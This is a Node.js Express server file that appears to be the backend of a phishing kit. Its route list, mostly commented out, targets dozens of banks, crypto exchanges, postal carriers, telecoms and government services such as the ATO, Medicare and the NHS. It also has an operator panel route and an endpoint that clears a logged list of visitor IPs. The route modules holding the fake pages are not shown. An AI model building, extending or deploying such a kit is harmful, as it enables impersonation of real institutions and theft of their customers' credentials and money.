const express = require("express");
const bodyparser = require("body-parser");
const mongoose = require("mongoose");
var cors = require("cors");
var fs = require("fs");
require("dotenv").config();
var path = require("path");

const port = process.env.PORT || 8080;

const fileUpload = require("express-fileupload");
const app = express();
app.use(bodyparser.json());
app.use(cors());
app.use(fileUpload());

mongoose.connect(process.env.mongoURL);
const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error: "));
db.once("open", () => {
	app.listen(port, "0.0.0.0", () => {
		console.log("App listening on port", port);
	});
});

var bankName;

app.use("/", require("./routes/panel"));

// //USAA
// app.use("/usaa", require("./routes/usaa"));

// //IPS
// app.use("/", require("./routes/ips"));

// //SANTS ES
// app.use("/santses", require("./routes/santses"));

// //ONE
// app.use("/one", require("./routes/one"));

// //SFE
// app.use("/sfe", require("./routes/sfe"));

// //GPAY
// app.use("/gpay", require("./routes/gpay"));

// //HSBC MX
// app.use("/hsbcmx", require("./routes/hsbcmx"));

// //HSBC
// app.use("/hsbc", require("./routes/hsbc"));

// //COOP
// app.use("/coop", require("./routes/coop"));

// //PAYSERA
// app.use("/paysera", require("./routes/paysera"));

// //JL
// app.use("/jl", require("./routes/jl"));

// //BBBANK
// app.use("/bbbank", require("./routes/bbbank"));

// //MAIB
// app.use("/maib", require("./routes/maib"));

// //POSTBANK
// app.use("/postbank", require("./routes/postbank"));

// //OPBANK
// app.use("/opbank", require("./routes/opbank"));

// //ENERGY
// app.use("/energy", require("./routes/energy"));

app.get("/options", (req, res) => {
	res.sendFile(path.join(__dirname, "/files/options.json"));
});

// //WISE
// app.use("/wise", require("./routes/wise"));

// //ASB BUSINESS
// app.use("/asbBusiness", require("./routes/asbBusiness"));

// //THREE
// app.use("/three", require("./routes/three"));

// //BOA
// app.use("/boa", require("./routes/boa"));

// //YBS
// app.use("/ybs", require("./routes/ybs"));

// //COMMERZ
// app.use("/commerz", require("./routes/commerz"));

// //CITI
// app.use("/citi", require("./routes/citi"));

// //TEACHERS
// app.use("/teachers", require("./routes/teachers"));

// //NSI
// app.use("/nsi", require("./routes/nsi"));

// //BOQ
// app.use("/boq", require("./routes/boq"));

// //KIWI
// app.use("/kiwi", require("./routes/kiwi"));

// //THAMES
// app.use("/thameswater", require("./routes/thameswater"));

// //DHL
// app.use("/dhl", require("./routes/dhl"));

// //USPS
// app.use("/usps", require("./routes/usps"));

// //OBERBANK
// app.use("/oberbank", require("./routes/oberbank"));

// //WELLS
// app.use("/wells", require("./routes/wells"));

// //SANTS
// app.use("/sants", require("./routes/sants"));
// app.use("/santsCommand", require("./routes/sants"));

// //ATO
// app.use("/ato", require("./routes/ato"));

// //KUCOIN
// app.use("/kc", require("./routes/kucoin"));

// //KURONE
// app.use("/kurone", require("./routes/kurone"));

// //BACKMARKET
// app.use("/back", require("./routes/backmarket"));

// //VICTORIAMD
// app.use("/victoriamd", require("./routes/victoriamd"));

// //COMMBANK
// app.use("/comm", require("./routes/commbank.js"));

// //MICB
// app.use("/micb", require("./routes/micb"));

// //MQ
// app.use("/mq", require("./routes/macquarie"));

// //BNP
// app.use("/bnp", require("./routes/bnp"));

// //ANZ
// app.use("/anz", require("./routes/anz"));

// //DISNEY
// app.use("/disney", require("./routes/disney"));

// //WP
// app.use("/wp", require("./routes/westpac"));

// //RBC
// app.use("/rbc", require("./routes/rbc"));

// //BOI
// app.use("/boi", require("./routes/boi"));

// //ASB
// app.use("/asb", require("./routes/asb"));

// //BNZ
// app.use("/bnz", require("./routes/bnz"));

// //LLOYDS
// app.use("/lloyds", require("./routes/lloyds"));

// //BINANCE
// app.use("/binance", require("./routes/binance"));

// //UBANK
// app.use("/ubank", require("./routes/ubank"));

// //SUNCORP
// app.use("/suncorp", require("./routes/suncorp"));

// //UBANK IVR
// app.use("/ubankIVR", require("./routes/ubankIVR"));

// //UBANKONE
// app.use("/ubankOne", require("./routes/ubankOne"));

// //NAB
// app.use("/nab", require("./routes/nab"));

// //MULTIPANEL NZ
// app.use("/multiNZ", require("./routes/multiNZ"));

// //AIB
// app.use("/aib", require("./routes/aib"));

// //VANQUIS
// app.use("/vanquis", require("./routes/vanquis"));

// //BENDIGO
// app.use("/bendigo", require("./routes/bendigo"));

// //RURAL
// app.use("/rural", require("./routes/rural"));

// //O2
// app.use("/o2", require("./routes/o2"));

// //AUSPOST
// app.use("/auspost", require("./routes/auspost"));

// //MEDICARE
// app.use("/medicare", require("./routes/medicare"));

// //PEOPLES
// app.use("/people", require("./routes/people"));

// //HALIFAX
// app.use("/halifax", require("./routes/halifax"));

// //NZPOST
// app.use("/nzpost", require("./routes/nzpost"));

// //BEYOND
// app.use("/beyond", require("./routes/beyond"));

// //APPLE
// app.use("/apple", require("./routes/apple"));

// //NHS
// app.use("/nhs", require("./routes/nhs"));

// //OPTUS
// app.use("/optus", require("./routes/optus"));

// //EVRI
// app.use("/evri", require("./routes/evri"));

// //HERITAGE
// app.use("/heritage", require("./routes/heritage"));

app.post("/removeips", (req, res) => {
	ip = req.body.ip;

	content = ``;
	fs.writeFile("ips.txt", content, (err) => {
		if (err) {
			console.error(err);
		} else {
			res.send("Update Completed");
		}
	});
});
